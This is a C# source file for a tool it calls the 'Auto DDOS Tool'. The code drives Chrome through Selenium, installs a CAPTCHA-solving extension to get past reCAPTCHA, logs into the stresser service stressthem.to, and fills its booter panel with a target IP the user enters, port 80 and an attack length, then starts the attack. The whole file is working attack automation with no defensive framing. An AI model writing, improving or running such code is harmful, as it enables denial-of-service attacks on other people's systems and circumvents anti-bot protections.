using System;
using System.Collections.Generic;
using System.Text;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System.Threading;
using System.Net.Mime;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;

namespace DDoSTool
{
    class GetSite
    {
        static string ChromeUrl = "https://chrome.google.com/webstore/detail/buster-captcha-solver-for/mpbjkejclgfgadiemmefgebjfooflfhl?hl=en";
        static string url = "https://www.stressthem.to/login";
        static string IP = string.Empty;
        static int seconds = 0;
        public static void begin()
        {
            Console.Clear();
            Console.WriteLine($"Welcome to the Auto DDOS Tool\nThe bot is currently at {url}.\nSearching for stressthem.to.\nPress any key to begin.");
            Console.ReadKey();
            Console.Clear();
            Console.WriteLine("Enter ip you want bye bye (example 127.0.0.1)");
            IP = Console.ReadLine();
            Console.WriteLine("How long you want bye bye (max 300, min 20)");
            seconds = Convert.ToInt32(Console.ReadLine());
            if (seconds > 300 || seconds < 20)
            {
                Console.Clear();
                Console.WriteLine("You entered more than 300 seconds or less than 20 seconds. Please follow the format.\nPress any key to continue");
                Console.ReadKey();
                begin();
            }
            Console.Clear();
            IWebDriver wb = new ChromeDriver();
            wb.Navigate().GoToUrl(ChromeUrl);
            //downloads recpata bypass
            MouseMover.ChromeInstall();
            wb.Navigate().GoToUrl(url);

            //stress them stuff starts
            try
            {
                var ConsentButton = wb.FindElement(By.XPath("//*[@id=\"yDmH0d\"]/c-wiz/div/div/div/div[2]/div[1]/div[4]/form/div[1]/div/button"));
                ConsentButton.Click();
            }
            catch
            {
                Console.WriteLine("No consent button found. Continuing...");
            }
            try
            {
                var Username = wb.FindElement(By.XPath("/html/body/div[2]/main/div/form/div[1]/input"));
                Username.SendKeys("");
                var Password = wb.FindElement(By.XPath("//*[@id=\"password\"]"));
                Password.SendKeys("");
                var LoginButton = wb.FindElement(By.XPath("/html/body/div[2]/main/div/form/div[4]/button"));
                LoginButton.Click();
            }
            catch
            {
                Console.WriteLine("Login skipped. User details regonsised.");
            }

            //clicks the auto complete recapture garbage
            MouseMover.RecaptureComplete();
            Thread.Sleep(6000);

            //stressthem stuff
            var BooterPannel = wb.FindElement(By.XPath("//*[@id=\"menu\"]/ul/li[2]/a"));
            BooterPannel.Click();
            var Method = wb.FindElement(By.XPath("//*[@id=\"layer4\"]/div[2]/select"));
            Method.Click();
            var MethodChosen = wb.FindElement(By.XPath("//*[@id=\"layer4\"]/div[2]/select/option[2]"));
            MethodChosen.Click();
            var TargetIp = wb.FindElement(By.XPath("//*[@id=\"booter\"]/div[2]/form/div[2]/input"));
            TargetIp.SendKeys(IP);
            Console.WriteLine("IP entered");
            var TargerPort = wb.FindElement(By.XPath("//*[@id=\"booter\"]/div[2]/form/div[2]/div[1]/input[1]"));
            TargerPort.SendKeys("80");
            Console.WriteLine("Port entered");
            var NumberOfSeconds = wb.FindElement(By.XPath("//*[@id=\"booter\"]/div[2]/form/div[2]/div[1]/input[2]"));
            NumberOfSeconds.SendKeys(Convert.ToString(seconds));
            var StartAttack = wb.FindElement(By.XPath("//*[@id=\"booter\"]/div[2]/form/div[2]/button"));
            StartAttack.Click();
            Console.WriteLine("Time entered");
            MessageBox.Show($"Attack on {IP} for {seconds} seconds has begun.");
            Console.WriteLine("\n\nAttack started succefully. Cleaning up injection");
            wb.Quit();
        }
    }
}
